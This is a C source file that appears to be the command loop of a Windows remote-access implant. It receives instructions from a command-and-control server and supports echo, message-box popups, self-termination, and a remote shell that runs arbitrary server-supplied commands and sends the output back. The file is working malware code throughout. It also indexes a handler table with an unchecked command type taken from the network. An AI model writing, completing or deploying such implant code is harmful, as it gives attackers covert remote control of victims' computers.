#include <windows.h>
#include "cnc.h"
#include "echo.h"
#include "shell.h"
#include "msgbox.h"
#include "logger.h"
#include "commander.h"

void handle_echo()
{
    int bytes_read, bytes_to_read;
    struct echo_cmd cmd;

    log_info("Received ECHO command.");
    bytes_read = recv_from_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining));
    if (bytes_read != sizeof(cmd.bytes_remaining))
    {
        log_error("Received invalid text length.");
        return;
    }
    while (cmd.bytes_remaining)
    {
        bytes_to_read = min(cmd.bytes_remaining, sizeof(cmd.data));
        bytes_read = recv_from_cnc(cmd.data, bytes_to_read);
        cmd.bytes_remaining -= bytes_read;
        if (send_to_cnc(cmd.data, bytes_read) != bytes_read)
        {
            log_error("Failed to echo the data.");
            return;
        }
    }
}

void handle_shell()
{
    unsigned int bytes_read;
    struct shell_cmd cmd;

    log_info("Received SHELL command.");
    bytes_read = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
    if (bytes_read != sizeof(cmd.cmd_len))
    {
        log_error("Received invalid command length.");
        return;
    }
    cmd.cmd = malloc(cmd.cmd_len + 1);
    if (!cmd.cmd)
    {
        log_error("Failed to allocate memory for the command.");
        return;
    }
    bytes_read = recv_from_cnc(cmd.cmd, cmd.cmd_len);
    if (bytes_read != cmd.cmd_len)
    {
        log_error("Received invalid command.");
        return;
    }
    cmd.cmd[cmd.cmd_len] = 0;
    log_info("Command: \"%s\"", cmd.cmd);
    shell(&cmd);
    while (TRUE)
    {
        bytes_read = read_shell_output(&cmd);
        if (bytes_read)
        {
            send_to_cnc(&bytes_read, sizeof(bytes_read));
            send_to_cnc(cmd.out, bytes_read);
        }
        else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
        {
            send_to_cnc(&bytes_read, sizeof(bytes_read));
            close_shell_process(&cmd);
            send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
            return;
        }
    }
}

void handle_msgbox()
{
    unsigned int bytes_read;
    struct msgbox_cmd cmd;

    log_info("Received MSGBOX command.");

    bytes_read = recv_from_cnc(&cmd.title_len, sizeof(cmd.title_len));
    if (bytes_read != sizeof(cmd.title_len))
    {
        log_error("Received invalid title length.");
        return;
    }
    cmd.title = malloc(cmd.title_len + 1);
    if (!cmd.title)
    {
        log_error("Failed to allocate memory for the title.");
        return;
    }
    bytes_read = recv_from_cnc(cmd.title, cmd.title_len);
    if (bytes_read != cmd.title_len)
    {
        log_error("Received invalid title.");
        return;
    }
    cmd.title[cmd.title_len] = 0;

    bytes_read = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
    if (bytes_read != sizeof(cmd.text_len))
    {
        log_error("Received invalid text length.");
        return;
    }
    cmd.text = malloc(cmd.text_len + 1);
    if (!cmd.text)
    {
        log_error("Failed to allocate memory for the text.");
        return;
    }
    bytes_read = recv_from_cnc(cmd.text, cmd.text_len);
    if (bytes_read != cmd.text_len)
    {
        log_error("Received invalid text.");
        return;
    }
    cmd.text[cmd.text_len] = 0;

    log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
    MessageBox(NULL, cmd.text, cmd.title, MB_OK);
    free(cmd.title);
    free(cmd.text);
}

void handle_suicide()
{
    log_info("Received SUICIDE command.");
    exit(EXIT_SUCCESS);
}

void listen_for_cmds()
{
    int bytes_read;
    struct cmd cmd;
    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide};

    while (TRUE)
    {
        log_info("Waiting for command.");
        bytes_read = recv_from_cnc(&cmd, sizeof(struct cmd));
        if (bytes_read != sizeof(struct cmd))
        {
            log_error("Received invalid command.");
            continue;
        }
        cmd_type_handler[cmd.type]();
    }
}
